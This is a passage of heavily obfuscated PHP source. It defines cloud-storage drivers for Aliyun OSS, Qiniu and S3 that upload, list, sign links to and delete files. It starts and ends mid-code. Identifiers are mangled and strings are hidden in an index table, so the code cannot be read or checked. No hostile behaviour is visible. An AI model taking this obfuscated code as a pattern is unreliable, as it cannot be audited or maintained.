$ôñÕ™Ÿ«[214]) { return parent::fileOut($¢à’Œ†û, $úÃçïê³, $×·Ê¤, $¾š„ëı); } $úÃçïê³ = $úÃçïê³ ? $ôñÕ™Ÿ«[1409] : $ôñÕ™Ÿ«[1410]; $ÉéÆÏÇ˜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ôñÕ™Ÿ«[1411] . rawurlencode("{$úÃçïê³}\x3b\x66\151\154\x65\x6e\x61\155\145\x3d{$×·Ê¤}")); $ÉéÆÏÇ˜[OSS\OssClient::OSS_SUB_RESOURCE] .= $ôñÕ™Ÿ«[1412] . rawurlencode($åê’É‘); $š¿ßëæ = $this->link($¢à’Œ†û, $ÉéÆÏÇ˜); $this->fileOutLink($š¿ßëæ); } public function fileOutServer($Ûš§¯Õ, $Ï²Ö’â = false, $óò»ÑÊÒ = false, $ğ¥ÖÂÒŸ = '') { parent::fileOut($Ûš§¯Õ, $Ï²Ö’â, $óò»ÑÊÒ, $ğ¥ÖÂÒŸ); } public function fileOutImage($àìşı­, $‚âöû¼‘ = 250) { $ÚŠ÷Æ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Æ š¦İÈ][1413] . $‚âöû¼‘); $¼´¤²Ô« = $this->link($àìşı­, $ÚŠ÷Æ); $this->fileOutLink($¼´¤²Ô«); } public function fileOutImageServer($‡íîô¯Í, $ŞİëÀÃ‡ = 250) { parent::fileOutImage($‡íîô¯Í, $ŞİëÀÃ‡); } public function fileOutLink($ë—°¿¿´) { $¾¤–Ğ‚ú =& $_SERVER[Æ š¦İÈ]; if (!$this->isCdnHost() && substr($ë—°¿¿´, 0, 7) == $¾¤–Ğ‚ú[1314]) { $ë—°¿¿´ = $¾¤–Ğ‚ú[1315] . substr($ë—°¿¿´, 7); } header($¾¤–Ğ‚ú[160] . $ë—°¿¿´); die; } public function hashMd5($ë¶ùıô, $¬†Ÿ¨ = '') { $‚Óô¯“† =& $_SERVER[Æ š¦İÈ]; $©‚×óÈû = $this->_objectMeta($ë¶ùıô); if (!$©‚×óÈû) { return $‚Óô¯“†[12]; } if (!isset($©‚×óÈû[$‚Óô¯“†[1388]]) && !empty($¬†Ÿ¨)) { $„¾¸ĞÑŠ = $this->updateObjMeta($ë¶ùıô, array($‚Óô¯“†[1388] => $¬†Ÿ¨)); $©‚×óÈû[$‚Óô¯“†[1388]] = $„¾¸ĞÑŠ ? $¬†Ÿ¨ : $‚Óô¯“†[12]; } return isset($©‚×óÈû[$‚Óô¯“†[1388]]) ? strtolower($©‚×óÈû[$‚Óô¯“†[1388]]) : $‚Óô¯“†[12]; } public function size($‰›œõÕ¯) { $¨¿æÃç– = $this->objectMeta($‰›œõÕ¯); return $¨¿æÃç– ? $¨¿æÃç–[$_SERVER[Æ š¦İÈ][80]] : 0; } public function info($’¦¶÷) { if ($this->isFolder($’¦¶÷)) { return $this->folderInfo($’¦¶÷); } else { if ($this->isFile($’¦¶÷)) { return $this->fileInfo($’¦¶÷); } } return !1; } public function exist($Ö•Ê¢©İ) { return $this->isFile($Ö•Ê¢©İ) || $this->isFolder($Ö•Ê¢©İ); } public function isFile($Œ‡Òëå‘) { return !$this->isFolder($Œ‡Òëå‘) && $this->objectMeta($Œ‡Òëå‘); } public function isFolder($ˆé¬öÔ) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][200], $ˆé¬öÔ); } protected function objectMeta($Ò‰ÛÑÖ) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][201], $Ò‰ÛÑÖ); } protected function _objectMeta($º–¨æœ) { $›º°ó÷ =& $_SERVER[Æ š¦İÈ]; try { $ªéğâ®Á = $this->client->getObjectMeta($this->bucket, $this->pathEncode($º–¨æœ)); } catch (OSS\Core\OssException $–¯·ºü¹) { $ªéğâ®Á = !1; } if ($ªéğâ®Á) { $ªéğâ®Á[$›º°ó÷[80]] = intval($ªéğâ®Á[$›º°ó÷[1386]]); } return $ªéğâ®Á; } protected function _isFolder($®şè©¡ˆ) { $Ö´Ø®ä =& $_SERVER[Æ š¦İÈ]; if ($®şè©¡ˆ == $Ö´Ø®ä[12] || $®şè©¡ˆ == $Ö´Ø®ä[8]) { return !0; } $‰¾á ã¨ = array($Ö´Ø®ä[1382] => $Ö´Ø®ä[8], $Ö´Ø®ä[1383] => rtrim($®şè©¡ˆ, $Ö´Ø®ä[8]) . $Ö´Ø®ä[8], $Ö´Ø®ä[1384] => 1, $Ö´Ø®ä[1385] => $Ö´Ø®ä[12]); $Ä˜ì¿• = $this->client->listObjects($this->bucket, $‰¾á ã¨); if ($Ä˜ì¿•->getObjectList() || $Ä˜ì¿•->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Ô©€¿ûÃ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Æ š¦İÈ][1414]; $this->_init($Ô©€¿ûÃ); } public function _init($ŞŞˆÖşÈ) { $ˆÆÄ°§¤ =& $_SERVER[Æ š¦İÈ]; foreach ($ŞŞˆÖşÈ as $ÂñóßÉ => $—ïÎ¿úª) { if (isset($this->{$ÂñóßÉ})) { $this->{$ÂñóßÉ} = $—ïÎ¿úª; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ˆÆÄ°§¤[1415] . LNG($ˆÆÄ°§¤[1373])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($È¤úëæ», $ò‹ÑË = '', $‡øÌ®Ò = REPEAT_RENAME) { if ($this->setContent($È¤úëæ», $ò‹ÑË)) { return $this->getPathOuter($È¤úëæ»); } return !1; } public function mkdir($şéƒ®¨İ, $Üİô’Ë¡ = REPEAT_SKIP) { $ğ¯•î¸ =& $_SERVER[Æ š¦İÈ]; $¡¬ãª¾ = trim($şéƒ®¨İ, $ğ¯•î¸[8]); if ($this->_isFolder($¡¬ãª¾)) { return $this->getPathOuter($¡¬ãª¾); } $şéƒ®¨İ = $¡¬ãª¾ . $ğ¯•î¸[8]; $÷ ¼­ = get_path_this($¡¬ãª¾); $¾êè†Ş = $şéƒ®¨İ . $÷ ¼­; if (!$this->mkfile($¾êè†Ş)) { return !1; } if (!$this->moveFile($¾êè†Ş, $şéƒ®¨İ)) { $this->delFile($¾êè†Ş); return !1; } return $this->getPathOuter($¡¬ãª¾); } public function copyFile($»Æûí³ú, $‡î÷µµÍ) { $µ°ûÕ¬ö = $this->bucketManager->copy($this->bucket, $»Æûí³ú, $this->bucket, $‡î÷µµÍ, !0); return $µ°ûÕ¬ö ? !1 : $this->getPathOuter($‡î÷µµÍ); } public function moveFile($õëÔ‘Ê¨, $˜ù¨œÉÑ) { $¿ñà¡šŒ = $this->bucketManager->move($this->bucket, $õëÔ‘Ê¨, $this->bucket, $˜ù¨œÉÑ, !0); return $¿ñà¡šŒ ? !1 : $this->getPathOuter($˜ù¨œÉÑ); } public function delFile($Òåü¥Ó§) { if (!$this->exist($Òåü¥Ó§)) { return !0; } $®Ä“Ò  = $this->bucketManager->delete($this->bucket, $Òåü¥Ó§); return $®Ä“Ò  ? !1 : !0; } public function delFolder($ô»üî×) { $«¯´»•Š =& $_SERVER[Æ š¦İÈ]; if (!$this->exist($ô»üî×)) { return !0; } $this->listItemCache = !1; $×ÎœùŸİ = $this->fileList($ô»üî×); $this->listItemCache = !0; $…€Üª°ª = trim($ô»üî×, $«¯´»•Š[8]) . $«¯´»•Š[8]; if (!empty($ô»üî×) && $ô»üî× !== $«¯´»•Š[192] && !in_array($…€Üª°ª, $×ÎœùŸİ[$«¯´»•Š[77]])) { $×ÎœùŸİ[$«¯´»•Š[77]][] = $…€Üª°ª; } $µÍÉô¶» = $this->delByBatch($×ÎœùŸİ[$«¯´»•Š[76]]); if (!$µÍÉô¶») { return !1; } $µÍÉô¶» = $this->delByBatch($×ÎœùŸİ[$«¯´»•Š[77]]); if (!$µÍÉô¶») { return !1; } return $this->delFile($…€Üª°ª); } private function delByBatch($¦ˆ¯ÁóÇ) { foreach (array_chunk($¦ˆ¯ÁóÇ, 1000) as $Ôß•îÁú) { $—×Ãî­¯ = $this->bucketManager->buildBatchDelete($this->bucket, $Ôß•îÁú); list($†µ—Šğ, $¼èßæı) = $this->bucketManager->batch($—×Ãî­¯); if ($¼èßæı) { return !1; } } return !0; } public function rename($…®ÍÉ¿Ë, $Ÿà„Î¤¬) { return $this->renameObject($…®ÍÉ¿Ë, $Ÿà„Î¤¬); } public function fileInfo($ºı¾‰â„, $Ôî‹°Ë = false, $Àâ¡ôæÊ = array()) { $Ãëêƒ‹ =& $_SERVER[Æ š¦İÈ]; $¼êæúœş = array($Ãëêƒ‹[32] => $this->pathThis($ºı¾‰â„), $Ãëêƒ‹[78] => $this->getPathOuter($Ãëêƒ‹[8] . $ºı¾‰â„), $Ãëêƒ‹[33] => $Ãëêƒ‹[194], $Ãëêƒ‹[80] => isset($Àâ¡ôæÊ[$Ãëêƒ‹[1416]]) ? $Àâ¡ôæÊ[$Ãëêƒ‹[1416]] : 0, $Ãëêƒ‹[169] => $this->ext($ºı¾‰â„)); if ($Ôî‹°Ë) { return $¼êæúœş; } $¼êæúœş[$Ãëêƒ‹[195]] = $¼êæúœş[$Ãëêƒ‹[86]] = 0; $¼êæúœş[$Ãëêƒ‹[196]] = $¼êæúœş[$Ãëêƒ‹[197]] = !0; if (empty($Àâ¡ôæÊ)) { $Àâ¡ôæÊ = $this->objectMeta($ºı¾‰â„); if (!$Àâ¡ôæÊ) { return $¼êæúœş; } } if (isset($Àâ¡ôæÊ[$Ãëêƒ‹[1417]])) { $¼êæúœş[$Ãëêƒ‹[86]] = substr($Àâ¡ôæÊ[$Ãëêƒ‹[1417]] . $Ãëêƒ‹[12], 0, 10); } if (isset($Àâ¡ôæÊ[$Ãëêƒ‹[1416]])) { $¼êæúœş[$Ãëêƒ‹[80]] = $Àâ¡ôæÊ[$Ãëêƒ‹[1416]]; } return $¼êæúœş; } public function folderInfo($óÚêŸ¿Ò, $ã£¾ùì§ = false) { $ı÷ßÆü’ =& $_SERVER[Æ š¦İÈ]; $ïß¦©®‹ = array($ı÷ßÆü’[32] => $this->pathThis($óÚêŸ¿Ò), $ı÷ßÆü’[78] => $this->getPathOuter($ı÷ßÆü’[8] . $óÚêŸ¿Ò), $ı÷ßÆü’[33] => $ı÷ßÆü’[79]); if ($ã£¾ùì§) { return $ïß¦©®‹; } $ïß¦©®‹[$ı÷ßÆü’[195]] = $ïß¦©®‹[$ı÷ßÆü’[86]] = 0; $ïß¦©®‹[$ı÷ßÆü’[196]] = $ïß¦©®‹[$ı÷ßÆü’[197]] = !0; $óÚêŸ¿Ò = rtrim($óÚêŸ¿Ò, $ı÷ßÆü’[8]) . $ı÷ßÆü’[8]; $ŸĞñ¦‰õ = $this->objectMeta($óÚêŸ¿Ò); if (isset($ŸĞñ¦‰õ[$ı÷ßÆü’[1417]])) { $ïß¦©®‹[$ı÷ßÆü’[86]] = substr($ŸĞñ¦‰õ[$ı÷ßÆü’[1417]] . $ı÷ßÆü’[12], 0, 10); } return $ïß¦©®‹; } public function listPath($¯“Œ©Ğƒ, $ÚøÜô„œ = false) { $çÀßÇßï =& $_SERVER[Æ š¦İÈ]; $šİ©¿ßï = $this->fileList($¯“Œ©Ğƒ, $çÀßÇßï[8], !0); foreach ($šİ©¿ßï[$çÀßÇßï[77]] as $Š¡€•öö => $°³ëÏß) { $šİ©¿ßï[$çÀßÇßï[77]][$Š¡€•öö] = $this->folderInfo($°³ëÏß, $ÚøÜô„œ); } foreach ($šİ©¿ßï[$çÀßÇßï[76]] as $Š¡€•öö => $°³ëÏß) { $šİ©¿ßï[$çÀßÇßï[76]][$Š¡€•öö] = $this->fileInfo($°³ëÏß[$çÀßÇßï[95]], $ÚøÜô„œ, $°³ëÏß); } return $šİ©¿ßï; } public function has($À©ËòÉü, $¨Ğ¥‡Î¨ = false, $£”À”ÊÓ = true) { $×¸ÓûÊ² =& $_SERVER[Æ š¦İÈ]; $À©ËòÉü = trim($À©ËòÉü, $×¸ÓûÊ²[8]); $ôí…€£ = empty($À©ËòÉü) && $À©ËòÉü !== $×¸ÓûÊ²[192] ? $×¸ÓûÊ²[12] : $À©ËòÉü . $×¸ÓûÊ²[8]; $ŞòéõíŒ = $×¸ÓûÊ²[12]; $Á½ĞÓ®µ = 500; $…ã¢Í„˜ = $×¸ÓûÊ²[8]; $»‰íÕ¬ = $Õì´ÏÄ¸ = 0; while (!0) { check_abort(); list($Ø¶½½¢Õ, $ÎœÒÚ§É) = $this->bucketManager->listFiles($this->bucket, $ôí…€£, $ŞòéõíŒ, $Á½ĞÓ®µ, $…ã¢Í„˜); if ($ÎœÒÚ§É) { break; } $ŞòéõíŒ = array_key_exists($×¸ÓûÊ²[1385], $Ø¶½½¢Õ) ? $ŞòéõíŒ = $Ø¶½½¢Õ[$×¸ÓûÊ²[1418]] : $×¸ÓûÊ²[12]; if ($¨Ğ¥‡Î¨) { if (!empty($Ø¶½½¢Õ[$×¸ÓûÊ²[1419]])) { $»‰íÕ¬ += count($Ø¶½½¢Õ[$×¸ÓûÊ²[1419]]); } if (!empty($Ø¶½½¢Õ[$×¸ÓûÊ²[1420]])) { $Õì´ÏÄ¸ += count($Ø¶½½¢Õ[$×¸ÓûÊ²[1420]]); } if ($ŞòéõíŒ === $×¸ÓûÊ²[12]) { break; } continue; } if ($£”À”ÊÓ) { if (!empty($Ø¶½½¢Õ[$×¸ÓûÊ²[1419]])) { return !0; } } else { if (!empty($Ø¶½½¢Õ[$×¸ÓûÊ²[1420]])) { return !0; } } if ($ŞòéõíŒ === $×¸ÓûÊ²[12]) { break; } } if ($¨Ğ¥‡Î¨) { return array($×¸ÓûÊ²[204] => $»‰íÕ¬, $×¸ÓûÊ²[205] => $Õì´ÏÄ¸); } return !1; } public function listAll($¥÷ôœÕ”) { $üšì²¶” =& $_SERVER[Æ š¦İÈ]; $¬™¼ô„’ = $this->fileList($¥÷ôœÕ”, $üšì²¶”[12], !0); $±›ß¹¿ = array(); foreach ($¬™¼ô„’[$üšì²¶”[76]] as $Àêµ÷¼â) { $±›ß¹¿[$Àêµ÷¼â[$üšì²¶”[95]]] = $Àêµ÷¼â[$üšì²¶”[80]]; } foreach ($¬™¼ô„’[$üšì²¶”[77]] as $Àêµ÷¼â) { if (is_string($Àêµ÷¼â)) { $±›ß¹¿[$Àêµ÷¼â] = 0; } } return $this->listAllFiles($¥÷ôœÕ”, array_keys($±›ß¹¿), $±›ß¹¿); } private function fileList($¿ÍêŒÌÄ, $®—Ÿ§‘ñ = '', $ú…ñï†Ï = 0) { $áò†Œ ï =& $_SERVER[Æ š¦İÈ]; $¿ÍêŒÌÄ = trim($¿ÍêŒÌÄ, $áò†Œ ï[8]); $“øÑöë± = empty($¿ÍêŒÌÄ) && $¿ÍêŒÌÄ !== $áò†Œ ï[192] ? $áò†Œ ï[12] : $¿ÍêŒÌÄ . $áò†Œ ï[8]; $ò´ûÔÌº = $áò†Œ ï[12]; $ûûÛÅ¯Ä = 1000; $•ªçôà³ = $this->listItemCache === !1 ? !1 : !0; $‹À¨‰Æ = $Í‡®ËØÑ = array(); while (!0) { check_abort(); list($úÛ¦©†ü, $µà•á´¨) = $this->bucketManager->listFiles($this->bucket, $“øÑöë±, $ò´ûÔÌº, $ûûÛÅ¯Ä, $®—Ÿ§‘ñ); if ($µà•á´¨) { break; } $ò´ûÔÌº = array_key_exists($áò†Œ ï[1385], $úÛ¦©†ü) ? $ò´ûÔÌº = $úÛ¦©†ü[$áò†Œ ï[1418]] : $áò†Œ ï[12]; $Áî¾Šõ¸ = isset($úÛ¦©†ü[$áò†Œ ï[1419]]) ? $úÛ¦©†ü[$áò†Œ ï[1419]] : array(); $Í‚Š¿ìÃ = isset($úÛ¦©†ü[$áò†Œ ï[1420]]) ? $úÛ¦©†ü[$áò†Œ ï[1420]] : array(); foreach ($Áî¾Šõ¸ as $ÛÍ‹Á‹Ï) { if ($ÛÍ‹Á‹Ï[$áò†Œ ï[95]] == $“øÑöë±) { continue; } $‡ó„Áºú = $ÛÍ‹Á‹Ï[$áò†Œ ï[95]]; $òòààõÒ = $ÛÍ‹Á‹Ï[$áò†Œ ï[1416]]; $ÛÍ‹Á‹Ï[$áò†Œ ï[80]] = $òòààõÒ; $İ£Á¤Œ¸ = $òòààõÒ == 0 && substr($‡ó„Áºú, strlen($‡ó„Áºú) - 1, 1) == $áò†Œ ï[8] ? !0 : !1; if ($•ªçôà³) { $this->cacheMethod($áò†Œ ï[200], $‡ó„Áºú, $İ£Á¤Œ¸); $this->cacheMethod($áò†Œ ï[201], $‡ó„Áºú, $ÛÍ‹Á‹Ï); } if ($İ£Á¤Œ¸) { $‹À¨‰Æ[] = $‡ó„Áºú; continue; } $Í‡®ËØÑ[] = $ú…ñï†Ï ? $ÛÍ‹Á‹Ï : $‡ó„Áºú; } foreach ($Í‚Š¿ìÃ as $‡ó„Áºú) { if ($‡ó„Áºú == $“øÑöë±) { continue; } $‹À¨‰Æ[] = $‡ó„Áºú; if ($•ªçôà³) { $this->cacheMethod($áò†Œ ï[200], $‡ó„Áºú, !0); } } if ($ò´ûÔÌº === $áò†Œ ï[12]) { break; } } if ($•ªçôà³) { $this->cacheMethod($áò†Œ ï[200], $¿ÍêŒÌÄ, !0); } return array($áò†Œ ï[77] => $‹À¨‰Æ, $áò†Œ ï[76] => $Í‡®ËØÑ); } public function canRead($ÎºåÈæµ) { return $this->exist($ÎºåÈæµ) ? !0 : !1; } public function canWrite($ó‡”Ã”½) { return $this->exist($ó‡”Ã”½) ? !0 : !1; } public function getContent($õ†ÆÖã) { return $this->fileSubstr($õ†ÆÖã, 0, -1); } public function setContent($ğ·¨ü, $áî«ğ½„ = '') { $µöÁÓœ– = $this->tempFile($this->pathThis($ğ·¨ü)); file_put_contents($µöÁÓœ–, $áî«ğ½„); if ($this->upload($ğ·¨ü, $µöÁÓœ–)) { $this->tempFileRemve($µöÁÓœ–); return !0; } return !1; } public function refreshUrls($ü ¶¿ë) { $½ıó‚Ïç =& $_SERVER[Æ š¦İÈ]; $ô…ô“±² = array(); if (is_array($ü ¶¿ë)) { foreach ($ü ¶¿ë as $šÕÖ§ Å) { $ô…ô“±²[] = $this->link($šÕÖ§ Å); } } else { $ô…ô“±²[] = $this->link($ü ¶¿ë); } $Œ“£‰¸ó = new Qiniu\Cdn\CdnManager($this->auth); list($¾¾úŞÑ‰, $’ÒÏµˆë) = $Œ“£‰¸ó->refreshUrls($ô…ô“±²); if ($’ÒÏµˆë) { return !1; } return $¾¾úŞÑ‰[$½ıó‚Ïç[1172]] == $½ıó‚Ïç[757] ? !0 : !1; } public function fileSubstr($Ïƒ¼ÏÔ¡, $Á Í‡Ÿ¦, $çïèÁ”¨) { $«ÍÎÂÙÅ =& $_SERVER[Æ š¦İÈ]; if (!($©íòµö¼ = $this->link($Ïƒ¼ÏÔ¡))) { return !1; } $˜¦¾Ááì = !1; if ($çïèÁ”¨ > 0) { $ä»éÔ×´ = $Á Í‡Ÿ¦ + $çïèÁ”¨ - 1; $˜¦¾Ááì = array($«ÍÎÂÙÅ[1421] . $Á Í‡Ÿ¦ . $«ÍÎÂÙÅ[462] . $ä»éÔ×´); } $ÔÚÇõİ = url_request($©íòµö¼, $«ÍÎÂÙÅ[227], !1, $˜¦¾Ááì); return $ÔÚÇõİ[$«ÍÎÂÙÅ[747]] ? $ÔÚÇõİ[$«ÍÎÂÙÅ[1182]] : !1; } public function upload($œ¹ÕËå», $“ôÛö, $¢¤ÑÒû¦ = false, $½÷ê­Í = REPEAT_REPLACE) { $¡‹†¢ê = new Qiniu\Storage\UploadManager(); $«ƒğèõä = $this->auth->uploadToken($this->bucket, $œ¹ÕËå»); $Š™Ù‘ßï = get_file_mime(get_path_ext($“ôÛö)); list($ øˆÁ¡æ, $ºèç¨ñÂ) = $¡‹†¢ê->putFile($«ƒğèõä, $œ¹ÕËå», $“ôÛö, null, $Š™Ù‘ßï); return $ºèç¨ñÂ ? !1 : $this->getPathOuter($œ¹ÕËå»); } public function uploadFormData($ÕêŞÊÔĞ, $›¥¾©æğ = 3600) { return $this->uploadToken($ÕêŞÊÔĞ, $›¥¾©æğ); } public function multiUploadFormData($…ãøÉÅ, $–È´½Çâ = 3600) { return $this->uploadToken($…ãøÉÅ, $–È´½Çâ); } private function uploadToken($Êß×¬ü, $öØØ¥û = 3600) { $×òÊÀæ =& $_SERVER[Æ š¦İÈ]; $Êğùö™Ã = $öØØ¥û; $Ğ²ƒ’áú = array($×òÊÀæ[1422] => $×òÊÀæ[1423]); $¦µ”Æ‰ = $Êß×¬ü; $™–œ¾©è = $this->auth->uploadToken($this->bucket, $¦µ”Æ‰, $Êğùö™Ã, $Ğ²ƒ’áú, !0); $ß§à®Øğ = empty($this->region) || $this->region == $×òÊÀæ[1424] ? $×òÊÀæ[12] : $×òÊÀæ[462] . $this->region; $‘‡Â’™ = http_type() . "\x3a\57\x2f\x75\160\x6c\x6f\x61\144{$ß§à®Øğ}\56\x71\151\x6e\151\165\160\56\x63\157\x6d\x2f"; return array($×òÊÀæ[1425] => $™–œ¾©è, $×òÊÀæ[1426] => $‘‡Â’™); } public function download($üÓ©ïœÔ, $¸×å¡—È) { $Äîğ˜— = IO::getPathInner(IO::mkfile($¸×å¡—È)); if (!($±Ã°¸‘… = $this->link($üÓ©ïœÔ))) { return !1; } $óÆ¨šö¯ = 0; $â‹·¡ğ« = 1024 * 200; $®”ñÏ­“ = fopen($Äîğ˜—, $_SERVER[Æ š¦İÈ][1427]); while (!0) { $Ü…¶çÑñ = $this->fileSubstr($üÓ©ïœÔ, $óÆ¨šö¯, $â‹·¡ğ«); if ($Ü…¶çÑñ === !1) { return !1; } fwrite($®”ñÏ­“, $Ü…¶çÑñ); $óÆ¨šö¯ += $â‹·¡ğ«; if (strlen($Ü…¶çÑñ) < $â‹·¡ğ«) { break; } } fclose($®”ñÏ­“); return $¸×å¡—È; } public function link($ªÆ°œÎ, $òº¤øüÕ = '') { if (!$this->isFile($ªÆ°œÎ)) { return !1; } $¡„‚úˆ½ = $this->getHost() . $_SERVER[Æ š¦İÈ][8] . $this->pathEncode($ªÆ°œÎ) . $òº¤øüÕ; return $this->auth->privateDownloadUrl($¡„‚úˆ½, 3600 * 12); } public function fileOut($ËŸÀ”ª§, $óóËíøÅ = false, $¼ÈÎøƒ¬ = false, $»ì¹É›Æ = '') { $©ïğĞ²‚ =& $_SERVER[Æ š¦İÈ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ËŸÀ”ª§, $óóËíøÅ, $¼ÈÎøƒ¬, $»ì¹É›Æ); } if (!$¼ÈÎøƒ¬) { $¼ÈÎøƒ¬ = $this->pathThis($ËŸÀ”ª§); } $Å“§§ë© = $óóËíøÅ ? $©ïğĞ²‚[1428] . rawurlencode($¼ÈÎøƒ¬) : $©ïğĞ²‚[12]; $çĞàŸÁõ = $this->link($ËŸÀ”ª§, $Å“§§ë©); $this->fileOutLink($çĞàŸÁõ); } public function fileOutServer($ĞÂŠ¶²», $Îƒ¥’„’ = false, $¯ˆñ¤È‚ = false, $ò”÷Ì“› = '') { parent::fileOut($ĞÂŠ¶²», $Îƒ¥’„’, $¯ˆñ¤È‚, $ò”÷Ì“›); } public function fileOutImage($Åû¸Êáê, $²ı°ª = 250) { $åĞŒÚøµ = $this->link($Åû¸Êáê, $_SERVER[Æ š¦İÈ][1429] . $²ı°ª); $this->fileOutLink($åĞŒÚøµ); } public function fileOutImageServer($ÒÇ€‰÷, $é˜Ùø‘ = 250) { parent::fileOutImage($ÒÇ€‰÷, $é˜Ùø‘); } public function hashMd5($ÑÒİƒ²«) { $Àò³÷ßË =& $_SERVER[Æ š¦İÈ]; $ ‚éˆ“ë = $this->objectMeta($ÑÒİƒ²«); return isset($ ‚éˆ“ë[$Àò³÷ßË[209]]) ? $ ‚éˆ“ë[$Àò³÷ßË[209]] : !1; $´’±÷ã‚ = $this->link($ÑÒİƒ²«, $Àò³÷ßË[1430]); } public function size($˜£ ½ˆß) { $Œ”™’– = $this->objectMeta($˜£ ½ˆß); return $Œ”™’– ? $Œ”™’–[$_SERVER[Æ š¦İÈ][80]] : 0; } public function info($¨éò—íÄ) { if ($this->isFolder($¨éò—íÄ)) { return $this->folderInfo($¨éò—íÄ); } else { if ($this->isFile($¨éò—íÄ)) { return $this->fileInfo($¨éò—íÄ); } } return !1; } public function exist($™»á»äÎ) { return $this->isFile($™»á»äÎ) || $this->isFolder($™»á»äÎ); } public function isFile($ÂòÂĞÓØ) { return !$this->isFolder($ÂòÂĞÓØ) && $this->objectMeta($ÂòÂĞÓØ); } public function isFolder($»“Ô›ÓÊ) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][200], $»“Ô›ÓÊ); } protected function objectMeta($ŒñŒ˜×Ê) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][201], $ŒñŒ˜×Ê); } protected function _objectMeta($ Í–¾Œ) { $å¶öÊöŸ =& $_SERVER[Æ š¦İÈ]; list($ÒŞÎÜ‘ä, $¯×©öè) = $this->bucketManager->stat($this->bucket, $ Í–¾Œ); if ($ÒŞÎÜ‘ä) { $ÒŞÎÜ‘ä[$å¶öÊöŸ[80]] = intval($ÒŞÎÜ‘ä[$å¶öÊöŸ[1416]]); } return $ÒŞÎÜ‘ä; } protected function _isFolder($»¸ÚíÅš) { $è€¶²ƒ‡ =& $_SERVER[Æ š¦İÈ]; if ($»¸ÚíÅš == $è€¶²ƒ‡[12] || $»¸ÚíÅš == $è€¶²ƒ‡[8]) { return !0; } list($ìàû¥É§, $æªÀıßí) = $this->bucketManager->listFiles($this->bucket, trim($»¸ÚíÅš, $è€¶²ƒ‡[8]) . $è€¶²ƒ‡[8], $è€¶²ƒ‡[12], 1, $è€¶²ƒ‡[8]); return !empty($ìàû¥É§[$è€¶²ƒ‡[1419]]) || !empty($ìàû¥É§[$è€¶²ƒ‡[1420]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($×ÊµĞåç) { parent::__construct($×ÊµĞåç); } public function uploadFormData($¨‰Ç³³, $µÈÛòÃĞ = 3600) { $—½äÊÜ› =& $_SERVER[Æ š¦İÈ]; $éŠÅÖ = $—½äÊÜ›[193]; $ÚºÅ±ß = $—½äÊÜ›[1335]; $şõïŠ¦ = $—½äÊÜ›[62]; $Õ¬¢‚…« = gmdate($—½äÊÜ›[1336]); $Ÿªï¶Ğı = gmdate($—½äÊÜ›[748]); $ãÕ°…Á‚ = $—½äÊÜ›[1337]; $şıÇ¦Êì = $µÈÛòÃĞ . $—½äÊÜ›[12]; $ ¿ªŞ¡« = $—½äÊÜ›[1299]; $†ñØ¶¼ä = array($this->accessKey, $Ÿªï¶Ğı, $this->region, $şõïŠ¦, $ãÕ°…Á‚); $À¥­¶Ä = implode($—½äÊÜ›[8], $†ñØ¶¼ä); $ª—¿¦Ö® = array($—½äÊÜ›[1301] => gmdate($—½äÊÜ›[1300], strtotime($—½äÊÜ›[1338])), $—½äÊÜ›[1302] => array(array($—½äÊÜ›[1304] => $this->bucket), array($—½äÊÜ›[1303] => $éŠÅÖ), array($—½äÊÜ›[1305], $—½äÊÜ›[1306], $—½äÊÜ›[12]), array($—½äÊÜ›[1305], $—½äÊÜ›[1339], $—½äÊÜ›[12]), array($—½äÊÜ›[1305], $—½äÊÜ›[1340], $—½äÊÜ›[12]), array($—½äÊÜ›[1307] => $ ¿ªŞ¡«), array($—½äÊÜ›[1341] => $À¥­¶Ä), array($—½äÊÜ›[1342] => $ÚºÅ±ß), array($—½äÊÜ›[1343] => $Õ¬¢‚…«), array($—½äÊÜ›[1344] => $şıÇ¦Êì))); $¨¶á”· = base64_encode(json_encode($ª—¿¦Ö®)); $Åñšìé´ = hash_hmac($—½äÊÜ›[1345], $Ÿªï¶Ğı, $—½äÊÜ›[1346] . $this->secret, !0); $½ŒÑûºï = hash_hmac($—½äÊÜ›[1345], $this->region, $Åñšìé´, !0); $»Ÿß‡¾ = hash_hmac($—½äÊÜ›[1345], $şõïŠ¦, $½ŒÑûºï, !0); $×è´²Úˆ = hash_hmac($—½äÊÜ›[1345], $ãÕ°…Á‚, $»Ÿß‡¾, !0); $’±‘®ÇÌ = hash_hmac($—½äÊÜ›[1345], $¨¶á”·, $×è´²Úˆ); $«“‡÷‘ = array($—½äÊÜ›[212] => $—½äÊÜ›[12], $—½äÊÜ›[1347] => $—½äÊÜ›[12], $—½äÊÜ›[1303] => $éŠÅÖ, $—½äÊÜ›[1307] => $ ¿ªŞ¡«, $—½äÊÜ›[1311] => $¨¶á”·, $—½äÊÜ›[1348] => $À¥­¶Ä, $—½äÊÜ›[1349] => $ÚºÅ±ß, $—½äÊÜ›[1350] => $Õ¬¢‚…«, $—½äÊÜ›[1351] => $şıÇ¦Êì, $—½äÊÜ›[1352] => $’±‘®ÇÌ, $—½äÊÜ›[176] => $this->getHost()); return $«“‡÷‘; } public function multiUploadFormData($—ÇÈè¥», $ºÑ¸üÒİ = 3600) { $òÅÏœöš =& $_SERVER[Æ š¦İÈ]; $ÌôıÆˆ’ = gmdate($òÅÏœöš[1431]); $ˆ®úá™í = array(); $ƒÉé¦Š = $this->client->getUploadId($this->bucket, $—ÇÈè¥», $ˆ®úá™í); if (!$ƒÉé¦Š) { return !1; } return 